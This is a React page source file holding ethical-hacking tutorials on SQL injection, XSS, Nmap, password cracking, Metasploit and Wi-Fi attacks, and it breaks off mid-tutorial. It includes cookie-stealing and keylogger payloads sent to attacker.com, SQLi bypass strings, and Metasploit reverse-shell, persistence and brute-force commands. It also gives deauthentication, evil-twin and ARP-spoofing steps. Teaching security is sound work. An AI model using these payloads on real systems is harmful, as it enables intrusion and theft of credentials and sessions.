'use client';

import { useState } from 'react';
import Link from 'next/link';
import { Shield, Lock, Terminal, Network, Eye, Key, Search, Bug, AlertTriangle, BookOpen, Clock, TrendingUp, Star, ExternalLink } from 'lucide-react';
import { useAuth } from '@/components/AuthContext';

export default function EthicalHackingPage() {
  const [selectedCategory, setSelectedCategory] = useState('All');
  const [selectedTutorial, setSelectedTutorial] = useState<any>(null);
  const { openAuthModal } = useAuth();

  const categories = ['All', 'Web Security', 'Network Security', 'Penetration Testing', 'Bug Bounty', 'CTF', 'Tools', 'Certifications'];

  const tutorials = [
    {
      id: 1,
      title: 'Introduction to Ethical Hacking',
      category: 'Web Security',
      difficulty: 'Beginner',
      duration: '15 min',
      views: '25.4K',
      icon: Shield,
      color: 'from-blue-500 to-cyan-500',
      excerpt: 'Learn the fundamentals of ethical hacking, penetration testing, and responsible disclosure.',
      popular: true,
      topics: ['Security Basics', 'Legal Frameworks', 'Testing Methodology'],
      content: `Ethical hacking is the practice of testing computer systems, networks, and applications to identify security vulnerabilities before malicious hackers can exploit them.

**What is Ethical Hacking?**
Ethical hackers, also known as "white hat" hackers, use the same techniques as malicious hackers but with authorization and the goal of improving security. They help organizations identify weaknesses in their security posture and provide recommendations for remediation.

**Key Principles:**
1. **Authorization**: Always obtain written permission before testing
2. **Confidentiality**: Keep findings private and report through proper channels
3. **No Harm**: Don't damage systems or steal data
4. **Responsible Disclosure**: Report vulnerabilities to the organization first
5. **Stay Within Scope**: Only test what you're authorized to test

**Legal Framework:**
Understanding the legal aspects is crucial. The Computer Fraud and Abuse Act (CFAA) in the US and Computer Misuse Act in the UK criminalize unauthorized access. Even with good intentions, testing without authorization is illegal. Always have a contract or bug bounty program terms in place.

**Testing Methodology:**
Professional penetration testers follow structured methodologies like:
- OWASP Testing Guide for web applications
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115 Technical Guide to Information Security Testing

**Career Paths:**
Ethical hacking offers various career opportunities including Penetration Tester, Security Consultant, Bug Bounty Hunter, Red Team Operator, and Security Researcher. Salaries typically range from $70,000 to $150,000+ depending on experience and certifications.`
    },
    {
      id: 2,
      title: 'OWASP Top 10 Vulnerabilities 2024',
      category: 'Web Security',
      difficulty: 'Intermediate',
      duration: '30 min',
      views: '32.1K',
      icon: Bug,
      color: 'from-red-500 to-orange-500',
      excerpt: 'Comprehensive guide to the most critical web application security risks and how to prevent them.',
      popular: true,
      topics: ['Injection', 'Broken Auth', 'XSS', 'CSRF'],
      content: `The OWASP Top 10 is a standard awareness document representing the most critical security risks to web applications. Understanding these vulnerabilities is essential for developers and security professionals.

**A01: Broken Access Control**
Occurs when users can act outside their intended permissions. Examples include viewing others' accounts, modifying data, or accessing admin functions. Prevention: Implement proper authentication, deny by default, log access control failures, and rate limit API calls.

**A02: Cryptographic Failures**
Previously known as Sensitive Data Exposure. Includes transmitting data in clear text, using weak encryption, or not enforcing encryption. Prevention: Classify data, encrypt sensitive data at rest and in transit, disable caching for sensitive data, use strong algorithms like AES-256.

**A03: Injection**
Injection flaws occur when untrusted data is sent as part of a command or query. SQL injection, NoSQL injection, OS command injection, and LDAP injection are common types. Prevention: Use parameterized queries, ORM frameworks, input validation, and principle of least privilege for database accounts.

**A04: Insecure Design**
A broad category focusing on design and architectural flaws. Includes threat modeling, secure design patterns, and reference architectures. Prevention: Establish secure development lifecycle, use threat modeling, implement secure design patterns, conduct security reviews early.

**A05: Security Misconfiguration**
The application might be vulnerable if security settings aren't implemented or maintained. Common issues: default credentials, unnecessary features enabled, error messages revealing sensitive info. Prevention: Implement hardening procedures, automate configuration, use minimal platforms, review security settings regularly.

**A06: Vulnerable and Outdated Components**
Using libraries with known vulnerabilities poses significant risk. Prevention: Remove unused dependencies, continuously inventory versions, only obtain from official sources, monitor for unmaintained components.

**A07: Identification and Authentication Failures**
Includes credential stuffing, brute force attacks, and weak authentication. Prevention: Implement multi-factor authentication, check passwords against breach databases, limit failed login attempts, use secure session management.

**A08: Software and Data Integrity Failures**
Occurs when code and infrastructure don't protect against integrity violations, such as insecure CI/CD pipelines or auto-updates without integrity verification. Prevention: Use digital signatures, verify integrity of components, ensure code review processes.

**A09: Security Logging and Monitoring Failures**
Insufficient logging allows attacks to go undetected. Prevention: Log all authentication, access control, and input validation failures. Use centralized log management, establish effective monitoring and alerting, implement incident response plans.

**A10: Server-Side Request Forgery (SSRF)**
Occurs when a web application fetches a remote resource without validating the URL. Can lead to internal service enumeration, file disclosure, or remote code execution. Prevention: Sanitize and validate all client-supplied input, enforce URL schema and port whitelisting, disable HTTP redirections.`
    },
    {
      id: 3,
      title: 'SQL Injection: From Basics to Advanced',
      category: 'Web Security',
      difficulty: 'Intermediate',
      duration: '45 min',
      views: '18.7K',
      icon: Terminal,
      color: 'from-purple-500 to-pink-500',
      excerpt: 'Master SQL injection techniques, detection methods, and mitigation strategies.',
      popular: true,
      topics: ['Union-based', 'Blind SQLi', 'Prevention'],
      content: `SQL Injection (SQLi) is one of the most dangerous web application vulnerabilities, allowing attackers to interfere with database queries and potentially access, modify, or delete data.

**Understanding SQL Injection:**
SQLi occurs when user-supplied input is incorporated into SQL queries without proper sanitization. For example:
SELECT * FROM users WHERE username='$input' AND password='$pass'
If input is: ' OR '1'='1' -- the query becomes:
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''
This bypasses authentication since 1=1 is always true.

**Types of SQL Injection:**

1. **In-band SQLi (Classic)**: Results are visible in the response
   - Error-based: Triggers database errors to extract information
   - Union-based: Uses UNION operator to combine results from multiple queries

2. **Blind SQLi**: No visible results, attacker infers info from behavior
   - Boolean-based: Different responses for true/false conditions
   - Time-based: Uses database sleep functions to infer information

3. **Out-of-band SQLi**: Data retrieved via different channel (DNS, HTTP)

**Detection Techniques:**
- Add single quote (') and observe errors
- Submit boolean conditions: 1=1 (true) and 1=2 (false)
- Time-based payloads: ' AND SLEEP(5)--
- Use automated tools: SQLMap, Burp Suite Scanner

**Advanced Exploitation:**

**Union-based Attack:**
' UNION SELECT NULL,username,password FROM users--
The UNION keyword combines results. Must match column count and data types.

**Extracting Database Schema:**
' UNION SELECT table_name,NULL FROM information_schema.tables--
This reveals all table names in the database.

**Blind SQLi with Time Delays:**
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--
If first character of version is '5', response delays 5 seconds.

**Prevention:**
1. **Parameterized Queries (Prepared Statements)**: Best defense
   stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
   stmt.setString(1, userId);

2. **Stored Procedures**: Pre-compiled SQL on database
3. **Input Validation**: Whitelist allowed characters
4. **Least Privilege**: Database accounts with minimal permissions
5. **WAF (Web Application Firewall)**: Additional layer of defense
6. **Escaping**: Last resort, properly escape special characters

**Tools:**
- SQLMap: Automated SQL injection tool
- Burp Suite: Manual testing and scanning
- OWASP ZAP: Free security scanner`
    },
    {
      id: 4,
      title: 'Network Reconnaissance with Nmap',
      category: 'Network Security',
      difficulty: 'Intermediate',
      duration: '25 min',
      views: '15.3K',
      icon: Network,
      color: 'from-green-500 to-teal-500',
      excerpt: 'Learn advanced Nmap scanning techniques for network discovery and security auditing.',
      popular: false,
      topics: ['Port Scanning', 'Service Detection', 'OS Fingerprinting'],
      content: `Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. It's essential for penetration testers to master Nmap for reconnaissance phases.

**Basic Scanning:**
nmap 192.168.1.1 - Basic scan of target
nmap 192.168.1.0/24 - Scan entire subnet
nmap -p 80,443 target.com - Scan specific ports

**Port Scanning Techniques:**

1. **TCP SYN Scan (-sS)**: Stealth scan, doesn't complete handshake
   nmap -sS target.com

2. **TCP Connect Scan (-sT)**: Complete connection, logged by target
   nmap -sT target.com

3. **UDP Scan (-sU)**: Scan UDP ports (slower)
   nmap -sU target.com

**Service and Version Detection:**
nmap -sV target.com - Detect service versions
nmap -A target.com - Aggressive scan (OS, version, scripts, traceroute)

**OS Fingerprinting:**
nmap -O target.com - Detect operating system
Uses TCP/IP stack fingerprinting techniques

**NSE Scripts (Nmap Scripting Engine):**
nmap --script vuln target.com - Vulnerability scanning
nmap --script http-enum target.com - HTTP enumeration
nmap --script ssl-cert target.com - SSL certificate info

**Timing and Performance:**
-T0 to -T5: Set timing template (0=paranoid, 5=insane)
nmap -T4 target.com - Aggressive timing (common in pentesting)

**Evasion Techniques:**
-f: Fragment packets
-D: Decoy scan with spoofed IPs
--source-port: Spoof source port
--data-length: Append random data

**Output Formats:**
-oN: Normal output
-oX: XML output
-oG: Grepable output
-oA: All formats

**Best Practices:**
- Always get authorization before scanning
- Use -T4 for faster scans on good networks
- Combine -sV with --version-intensity for accuracy
- Save output for documentation and reporting`
    },
    {
      id: 5,
      title: 'Cross-Site Scripting (XSS) Exploitation',
      category: 'Web Security',
      difficulty: 'Intermediate',
      duration: '35 min',
      views: '14.2K',
      icon: Bug,
      color: 'from-yellow-500 to-orange-500',
      excerpt: 'Understand XSS vulnerabilities, exploitation techniques, and defensive programming.',
      popular: false,
      topics: ['Reflected XSS', 'Stored XSS', 'DOM XSS'],
      content: `Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. It's one of the most common web vulnerabilities.

**Types of XSS:**

**1. Reflected XSS (Non-Persistent):**
Malicious script is reflected off the web server in error messages or search results.
Example: http://site.com/search?q=<script>alert(1)</script>
The script executes immediately when the victim clicks the link.

**2. Stored XSS (Persistent):**
Malicious script is permanently stored on target server (database, forum, comment field).
Every user who views the content executes the script.
Most dangerous type - affects multiple users.

**3. DOM-Based XSS:**
Vulnerability exists in client-side code rather than server-side.
Example: document.write(location.hash)
If URL contains #<script>alert(1)</script>, it executes.

**Common Payloads:**

**Basic Alert:**
<script>alert('XSS')</script>

**Cookie Stealing:**
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

**Keylogger:**
<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>

**Session Hijacking:**
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

**Bypassing Filters:**

If <script> is blocked, try:
- <img src=x onerror=alert(1)>
- <svg onload=alert(1)>
- <body onload=alert(1)>
- <iframe src="javascript:alert(1)">

**Encoding Techniques:**
- HTML encoding: &lt;script&gt;
- URL encoding: %3Cscript%3E
- Unicode: \\u003cscript\\u003e
- Hex: &#x3C;script&#x3E;

**Prevention:**

1. **Input Validation:** Whitelist allowed characters
2. **Output Encoding:** Encode data before rendering
   - HTML context: &lt; &gt; &amp;
   - JavaScript context: escape quotes and backslashes
   - URL context: URL encode parameters
3. **Content Security Policy (CSP):** Restrict script sources
   Content-Security-Policy: default-src 'self'; script-src 'self' trusted.com
4. **HTTPOnly Cookies:** Prevent JavaScript access
5. **Use Security Libraries:** DOMPurify for sanitization
6. **Framework Protection:** React, Angular auto-escape by default`
    },
    {
      id: 6,
      title: 'Password Cracking with John the Ripper',
      category: 'Tools',
      difficulty: 'Beginner',
      duration: '20 min',
      views: '12.8K',
      icon: Key,
      color: 'from-indigo-500 to-purple-500',
      excerpt: 'Learn password cracking techniques using John the Ripper for security assessments.',
      popular: false,
      topics: ['Hash Cracking', 'Dictionary Attacks', 'Rainbow Tables'],
      content: `John the Ripper (JTR) is a fast password cracker for testing password strength. It's essential for security assessments and penetration testing.

**Understanding Password Hashing:**
Passwords are stored as hashes (one-way cryptographic functions).
Common hash types:
- MD5: 32 hex characters (weak, deprecated)
- SHA-1: 40 hex characters (weak)
- SHA-256: 64 hex characters
- bcrypt: Includes salt, computational cost

**Installing John:**
Linux: sudo apt install john
macOS: brew install john
Includes support for CPU and GPU cracking

**Basic Usage:**

**Cracking a Hash File:**
john hashes.txt
John auto-detects hash format and starts cracking

**Specify Format:**
john --format=raw-md5 hashes.txt
john --format=bcrypt hashes.txt

**Dictionary Attack:**
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Uses common passwords from wordlist

**View Cracked Passwords:**
john --show hashes.txt

**Attack Modes:**

**1. Single Crack Mode:**
john --single hashes.txt
Uses username and GECOS info to generate candidates

**2. Wordlist Mode:**
john --wordlist=passwords.txt hashes.txt
Tests passwords from dictionary file

**3. Incremental Mode (Brute Force):**
john --incremental hashes.txt
Tries all possible character combinations (slow)

**Rules and Mangling:**
Apply transformation rules to wordlist entries:
john --wordlist=dict.txt --rules hashes.txt

Common rules:
- Append numbers: password -> password123
- Capitalize: password -> Password
- Replace characters: password -> p@ssw0rd

**Advanced Techniques:**

**Cracking /etc/shadow:**
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

**Cracking ZIP Files:**
zip2john file.zip > hash.txt
john hash.txt

**Cracking RAR Files:**
rar2john file.rar > hash.txt
john hash.txt

**Performance Tips:**
- Use --fork=4 for multi-core processing
- GPU acceleration with John Jumbo version
- Start with dictionary attack before brute force
- Use --session to save and resume sessions

**Defense Against Password Cracking:**
1. Use long passwords (12+ characters)
2. Include uppercase, lowercase, numbers, symbols
3. Avoid dictionary words and common patterns
4. Use password managers
5. Implement account lockout policies
6. Use strong hashing algorithms (bcrypt, Argon2)
7. Add salt to hashes
8. Implement rate limiting`
    },
    {
      id: 7,
      title: 'Getting Started with Bug Bounty',
      category: 'Bug Bounty',
      difficulty: 'Beginner',
      duration: '40 min',
      views: '28.5K',
      icon: Search,
      color: 'from-pink-500 to-red-500',
      excerpt: 'Complete guide to starting your bug bounty journey, from choosing platforms to writing reports.',
      popular: true,
      topics: ['Platform Selection', 'Reconnaissance', 'Report Writing'],
      content: `Bug bounty hunting involves finding and reporting security vulnerabilities to companies in exchange for rewards. It's a great way to learn security and earn money legally.

**Popular Bug Bounty Platforms:**

**HackerOne:** Largest platform, companies like Uber, GitHub, Nintendo
**Bugcrowd:** Wide variety of programs, good for beginners
**Intigriti:** European focus, high-quality programs
**YesWeHack:** Growing platform with unique programs
**Synack:** Invitation-only, vetted security researchers

**Getting Started:**

**1. Learn the Basics:**
- Web application security fundamentals
- OWASP Top 10 vulnerabilities
- HTTP protocol and web technologies
- Basic programming (JavaScript, Python)

**2. Set Up Your Environment:**
- Burp Suite (web proxy for testing)
- Browser with developer tools
- Note-taking tool (Notion, Obsidian)
- Screenshot tool for evidence

**3. Choose Your First Program:**
Start with programs that have:
- Large scope (many domains/apps to test)
- Good reputation score
- Responsive team
- Clear policy
Avoid programs with very low bounties or slow response times.

**Reconnaissance Phase:**

**Subdomain Enumeration:**
- Subfinder, Amass, Assetfinder
- Find all subdomains of target

**Technology Detection:**
- Wappalyzer, BuiltWith
- Identify frameworks, CMS, libraries

**Content Discovery:**
- ffuf, gobuster, dirsearch
- Find hidden endpoints and files

**Google Dorking:**
site:target.com inurl:admin
site:target.com filetype:pdf
site:target.com intitle:"index of"

**Common Vulnerability Types:**

**High Impact (Good Bounties):**
- SQL Injection
- Remote Code Execution (RCE)
- Authentication Bypass
- Server-Side Request Forgery (SSRF)
- Insecure Direct Object Reference (IDOR)

**Medium Impact:**
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Sensitive Data Exposure
- Business Logic Flaws

**Report Writing:**

**Good Report Structure:**
1. **Summary:** One-sentence description
2. **Severity:** Impact and likelihood
3. **Steps to Reproduce:** Detailed, numbered steps
4. **Proof of Concept:** Screenshots, videos, code
5. **Impact:** Business impact explanation
6. **Remediation:** How to fix the vulnerability

**Example:**
Title: SQL Injection in Login Form
Severity: Critical
Description: The login form at login.php is vulnerable to SQL injection, allowing authentication bypass and data extraction.
Steps to Reproduce:
1. Navigate to https://target.com/login.php
2. Enter ' OR '1'='1' -- in username field
3. Observe successful login without password

**Tips for Success:**

1. **Quality over Quantity:** One good report beats ten poor ones
2. **Read the Policy:** Know what's in/out of scope
3. **Be Patient:** Teams may take weeks to respond
4. **Document Everything:** Take screenshots at each step
5. **Learn Continuously:** Study disclosed reports
6. **Specialize:** Focus on specific vulnerability types
7. **Automate Recon:** Build custom tools and scripts
8. **Network:** Join bug bounty communities
9. **Stay Ethical:** Never go beyond the scope
10. **Don't Get Discouraged:** Duplicates and N/A happen

**Earnings Potential:**
Beginners: $100-$500/month
Intermediate: $1,000-$5,000/month
Advanced: $10,000-$50,000+/month
Top hunters make $100k-$1M+ annually`
    },
    {
      id: 8,
      title: 'Metasploit Framework: Complete Guide',
      category: 'Penetration Testing',
      difficulty: 'Advanced',
      duration: '60 min',
      views: '16.9K',
      icon: Terminal,
      color: 'from-gray-600 to-gray-800',
      excerpt: 'Master the Metasploit Framework for penetration testing and vulnerability exploitation.',
      popular: false,
      topics: ['MSFconsole', 'Exploits', 'Payloads', 'Post-Exploitation'],
      content: `Metasploit is the world's most popular penetration testing framework. It provides thousands of exploits, payloads, and auxiliary modules for security testing.

**Installation:**
Kali Linux: Pre-installed
Ubuntu: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

**Starting Metasploit:**
msfconsole - Launch the console interface
msfdb init - Initialize the database (first time)

**Core Concepts:**

**Exploits:** Code that takes advantage of vulnerabilities
**Payloads:** Code that runs after successful exploitation
**Auxiliary:** Supporting modules (scanners, fuzzers)
**Encoders:** Obfuscate payloads to evade detection
**Post:** Post-exploitation modules

**Basic Workflow:**

**1. Search for Exploit:**
search type:exploit platform:windows smb
search CVE-2021-34527

**2. Select Exploit:**
use exploit/windows/smb/ms17_010_eternalblue

**3. View Options:**
show options - Required and optional settings
show payloads - Compatible payloads

**4. Set Options:**
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set payload windows/meterpreter/reverse_tcp

**5. Run Exploit:**
exploit or run

**Common Payloads:**

**Reverse Shell:** Target connects back to attacker
windows/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

**Bind Shell:** Attacker connects to target
windows/shell/bind_tcp

**Meterpreter:** Advanced payload with many features
File system access, process management, network pivoting

**Meterpreter Commands:**

**System Info:**
sysinfo - System information
getuid - Current user
ps - Process list

**File System:**
pwd - Current directory
ls - List files
cd - Change directory
download file.txt - Download file
upload tool.exe - Upload file

**Privilege Escalation:**
getsystem - Attempt privilege escalation
use post/multi/recon/local_exploit_suggester

**Network:**
route - View/add routes
portfwd add -l 3389 -p 3389 -r 192.168.1.100

**Persistence:**
run persistence -X -i 10 -p 4444 -r attacker_ip

**Auxiliary Modules:**

**Port Scanning:**
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

**SMB Enumeration:**
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

**Brute Force:**
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

**Database Usage:**

**Workspace Management:**
workspace - List workspaces
workspace -a pentest1 - Create workspace
workspace pentest1 - Switch to workspace

**Store Results:**
db_nmap -A 192.168.1.100 - Run nmap, store results
hosts - View discovered hosts
services - View discovered services

**Advanced Techniques:**

**Pivoting:**
Use compromised machine to access internal network
route add 10.10.10.0 255.255.255.0 session_id

**Pass the Hash:**
use exploit/windows/smb/psexec
set SMBPass hash_value

**Best Practices:**
1. Always get authorization
2. Use database to organize findings
3. Take notes and screenshots
4. Clean up after testing (remove backdoors)
5. Update Metasploit regularly: msfupdate
6. Use workspaces for different engagements
7. Practice in labs (Metasploitable, HackTheBox)`
    },
    {
      id: 9,
      title: 'Web Application Penetration Testing',
      category: 'Penetration Testing',
      difficulty: 'Advanced',
      duration: '90 min',
      views: '21.3K',
      icon: Lock,
      color: 'from-blue-600 to-purple-600',
      excerpt: 'Complete methodology for testing web applications, from information gathering to reporting.',
      popular: true,
      topics: ['OWASP Testing Guide', 'Burp Suite', 'Manual Testing'],
      content: `Web application penetration testing is a structured process to identify security vulnerabilities in web applications. This guide covers the complete methodology.

**Phase 1: Information Gathering**

**Passive Reconnaissance:**
- Google dorking for exposed info
- WHOIS lookup for domain info
- DNS enumeration (dig, nslookup)
- Social media/GitHub for leaked credentials
- Wayback Machine for old versions

**Active Reconnaissance:**
- Subdomain enumeration (Subfinder, Amass)
- Port scanning (Nmap)
- Technology fingerprinting (Wappalyzer)
- Crawling/spidering (Burp Spider, Hakrawler)

**Phase 2: Mapping the Application**

**Manual Exploration:**
- Browse entire application
- Test all functionality
- Identify entry points (forms, parameters)
- Map authentication mechanism
- Note interesting behaviors

**Automated Spidering:**
Configure Burp Suite proxy
Enable automated scanning
Review discovered endpoints
Analyze parameter usage

**Phase 3: Vulnerability Assessment**

**Authentication Testing:**
- Weak passwords
- Brute force protection
- Password reset flaws
- Session management issues
- Remember me functionality
- Logout functionality
- Multi-factor authentication bypass

**Authorization Testing:**
- Vertical privilege escalation
- Horizontal privilege escalation
- IDOR (Insecure Direct Object Reference)
- Missing function-level access control
- Path traversal

**Input Validation Testing:**
- SQL Injection (all input points)
- Cross-Site Scripting (XSS)
- Command Injection
- XML External Entity (XXE)
- Server-Side Template Injection (SSTI)
- Path Traversal
- File Upload vulnerabilities

**Session Management:**
- Session token strength
- Cookie security flags (HttpOnly, Secure)
- Session fixation
- Session timeout
- CSRF token implementation

**Business Logic Testing:**
- Price manipulation
- Quantity manipulation
- Discount abuse
- Workflow bypass
- Rate limiting bypass

**Phase 4: Exploitation**

**Proof of Concept Development:**
Create working exploit demonstrating impact
Document exact steps to reproduce
Capture screenshots/videos
Avoid causing damage

**Impact Analysis:**
Determine severity (Critical/High/Medium/Low)
Assess business impact
Consider attack complexity
Evaluate remediation difficulty

**Phase 5: Reporting**

**Executive Summary:**
- High-level overview
- Key findings
- Risk assessment
- Recommendations

**Technical Details:**
For each vulnerability:
1. **Title:** Descriptive name
2. **Severity:** CVSS score
3. **Description:** Detailed explanation
4. **Location:** URLs, parameters
5. **Steps to Reproduce:** Numbered list
6. **Proof of Concept:** Screenshots, code
7. **Impact:** Business consequences
8. **Remediation:** How to fix
9. **References:** CVE, OWASP links

**Essential Tools:**

**Burp Suite:**
Intercepting proxy, scanner, repeater, intruder
Essential for manual testing

**OWASP ZAP:**
Free alternative to Burp Suite
Good automated scanning

**SQLMap:**
Automated SQL injection tool
python sqlmap.py -u "url?id=1" --dbs

**XSStrike:**
Advanced XSS detection
python xsstrike.py -u "url?search="

**Nikto:**
Web server scanner
nikto -h target.com

**ffuf:**
Fast web fuzzer for content discovery
ffuf -u http://target/FUZZ -w wordlist.txt

**Best Practices:**

1. **Scope Adherence:** Stay within authorized scope
2. **Document Everything:** Screenshots, requests, responses
3. **No Automated Exploitation:** Manual verification required
4. **Respect Rate Limits:** Don't DoS the application
5. **Secure Communication:** Encrypted channels for sensitive data
6. **Remediation Verification:** Retest after fixes
7. **Continuous Learning:** Study new techniques
8. **Legal Protection:** Signed contract before testing`
    },
    {
      id: 10,
      title: 'CTF Challenges: Beginner to Advanced',
      category: 'CTF',
      difficulty: 'All Levels',
      duration: '120 min',
      views: '19.7K',
      icon: Star,
      color: 'from-yellow-500 to-red-500',
      excerpt: 'Practice your skills with Capture The Flag challenges covering various security domains.',
      popular: true,
      topics: ['Web Exploitation', 'Cryptography', 'Reverse Engineering'],
      content: `Capture The Flag (CTF) competitions are cybersecurity challenges where participants find "flags" (strings) by exploiting vulnerabilities. They're excellent for learning and practicing security skills.

**Types of CTF Competitions:**

**Jeopardy-Style:**
Categories of challenges with point values
Solve independently in any order
Most common format
Categories: Web, Crypto, Reverse Engineering, Pwn, Forensics, OSINT

**Attack-Defense:**
Each team has services to defend while attacking others
Real-time competition
More complex, requires defensive skills

**King of the Hill:**
Compete to control vulnerable machines
Maintain access while preventing others
Fast-paced, exciting format

**CTF Challenge Categories:**

**1. Web Exploitation:**
**Common Vulnerabilities:**
- SQL Injection
- XSS (Cross-Site Scripting)
- Command Injection
- Server-Side Request Forgery (SSRF)
- Local/Remote File Inclusion
- Authentication bypass

**Tools:** Burp Suite, sqlmap, curl, browser DevTools

**2. Cryptography:**
**Challenge Types:**
- Classical ciphers (Caesar, Vigenère)
- Modern encryption (RSA, AES)
- Hash functions
- Encoding (Base64, Hex)
- Known plaintext attacks

**Tools:** CyberChef, Python, OpenSSL

**3. Reverse Engineering:**
**Tasks:**
- Analyzing compiled binaries
- Understanding program logic
- Finding hidden functionality
- Decompiling/disassembling code

**Tools:** Ghidra, IDA Pro, radare2, gdb, strings

**4. Binary Exploitation (Pwn):**
**Techniques:**
- Buffer overflows
- Format string vulnerabilities
- Return-oriented programming (ROP)
- Use-after-free
- Heap exploitation

**Tools:** pwntools, gdb, checksec, ROPgadget

**5. Forensics:**
**Challenges:**
- Analyzing memory dumps
- Recovering deleted files
- Examining network captures
- Steganography
- Log analysis

**Tools:** Volatility, Autopsy, Wireshark, binwalk, ExifTool

**6. OSINT (Open Source Intelligence):**
**Tasks:**
- Finding information from public sources
- Social media investigation
- Domain/IP research
- Geolocation
- Metadata analysis

**Tools:** Google, Maltego, Shodan, theHarvester

**Getting Started with CTF:**

**Practice Platforms:**
1. **picoCTF** - Beginner-friendly, educational focus
2. **HackTheBox** - Realistic machines, active community
3. **TryHackMe** - Guided learning paths
4. **OverTheWire** - Command line challenges
5. **CTFtime.org** - Find upcoming competitions

**Beginner Tips:**

1. **Start Small:** Begin with easy challenges
2. **Learn as You Go:** Google is your friend
3. **Read Writeups:** After solving (or failing), read others' solutions
4. **Join a Team:** Collaborate and learn together
5. **Take Notes:** Document your methodology
6. **Use CTFtime:** Track your progress and team stats
7. **Practice Regularly:** Consistency is key
8. **Specialize:** Focus on 1-2 categories you enjoy

**Essential Skills:**

**Programming:**
- Python for automation and exploits
- Bash scripting for system tasks
- C for understanding memory
- JavaScript for web challenges

**Tools & Technologies:**
- Linux command line
- Networking fundamentals
- Web technologies (HTTP, cookies, sessions)
- Assembly basics
- Binary file formats

**Advanced Techniques:**

**Automation:**
Write scripts to automate repetitive tasks
Use pwntools for exploit development
Create tools for specific challenge types

**Team Collaboration:**
Use Discord/Slack for communication
Share knowledge and tools
Divide challenges by specialty
Document findings in shared notes

**Time Management:**
Low-hanging fruit first (easy points)
Don't get stuck on one challenge
Take breaks to maintain focus
Review challenge descriptions carefully

**Common CTF Tools:**

**General:**
- Python with pwntools, requests
- Netcat for network connections
- curl for HTTP requests
- Burp Suite for web testing

**Crypto:**
- CyberChef for decoding
- RsaCtfTool for RSA attacks
- hashcat for hash cracking

**Binary:**
- Ghidra for reverse engineering
- gdb with pwndbg/gef
- ROPgadget for ROP chains

**Forensics:**
- binwalk for file analysis
- Volatility for memory forensics
- Wireshark for network analysis

**Resources:**
- CTFtime.org - Competition calendar
- YouTube channels: LiveOverflow, John Hammond, IppSec
- Writeup repositories on GitHub
- CTF Discord servers
- Practice: picoCTF, HackTheBox, TryHackMe`
    },
    {
      id: 11,
      title: 'Wireless Network Security Testing',
      category: 'Network Security',
      difficulty: 'Advanced',
      duration: '50 min',
      views: '11.2K',
      icon: Network,
      color: 'from-cyan-500 to-blue-500',
      excerpt: 'Learn wireless security testing with tools like Aircrack-ng and understand WPA/WPA2/WPA3.',
      popular: false,
      topics: ['WiFi Security', 'WPA Cracking', 'Evil Twin'],
      content: `Wireless network security testing identifies vulnerabilities in WiFi networks. Understanding WiFi security is essential for penetration testers and security professionals.

**WiFi Security Standards:**

**WEP (Wired Equivalent Privacy):**
- Deprecated, extremely weak
- Crackable in minutes
- Should never be used

**WPA (WiFi Protected Access):**
- Improvement over WEP but still vulnerable
- TKIP encryption
- Susceptible to various attacks

**WPA2:**
- Current standard, uses AES encryption
- Vulnerable to KRACK attack
- Secure with strong password
- Pre-shared key (PSK) or Enterprise (802.1X)

**WPA3:**
- Latest standard, improved security
- Protection against offline dictionary attacks
- Forward secrecy
- Individualized data encryption

**Required Tools:**

**Hardware:**
- WiFi adapter with monitor mode support
  - Alfa AWUS036NHA (popular choice)
  - TP-Link TL-WN722N
- Kali Linux or similar security distro

**Software:**
- Aircrack-ng suite
- Wireshark
- Reaver (WPS attacks)
- Hashcat (password cracking)
- Bettercap (MITM attacks)

**Basic Wireless Reconnaissance:**

**1. Enable Monitor Mode:**
sudo airmon-ng start wlan0
Creates mon0 or wlan0mon interface

**2. Scan for Networks:**
sudo airodump-ng wlan0mon
Shows BSSID, channel, encryption, ESSID
Note target's BSSID and channel

**3. Capture Handshake:**
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
Captures packets on channel 6 for specific AP

**4. Deauthentication Attack:**
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
Forces client disconnection to capture handshake

**WPA/WPA2 PSK Cracking:**

**After Capturing Handshake:**

**Dictionary Attack with Aircrack:**
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

**GPU Acceleration with Hashcat:**
Convert .cap to .hccapx format
hashcat -m 22000 capture.hccapx rockyou.txt

**Success depends on:**
- Password strength
- Wordlist quality
- Computing power

**WPS Attacks:**

**WPS (WiFi Protected Setup) Vulnerabilities:**
PIN has only 11,000 possible combinations (weak)

**Reaver Attack:**
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
Brute forces WPS PIN
Can take hours but effective on vulnerable routers

**Check WPS Status:**
sudo wash -i wlan0mon
Lists networks with WPS enabled

**Evil Twin Attack:**

**Concept:**
Create fake access point mimicking legitimate one
Intercept credentials when users connect

**Setup with Bettercap:**
sudo bettercap -iface wlan0mon
>> wifi.recon on
>> set wifi.ap.ssid "Target_Network"
>> set wifi.ap.bssid AA:BB:CC:DD:EE:FF
>> set wifi.ap.channel 6
>> wifi.ap

**Capture Credentials:**
Use captive portal to phish passwords
Downgrade to HTTP to capture traffic

**MITM Attacks on Wireless:**

**Once on Network:**

**ARP Spoofing:**
sudo arpspoof -i wlan0 -t victim_ip gateway_ip
Intercept victim's traffic

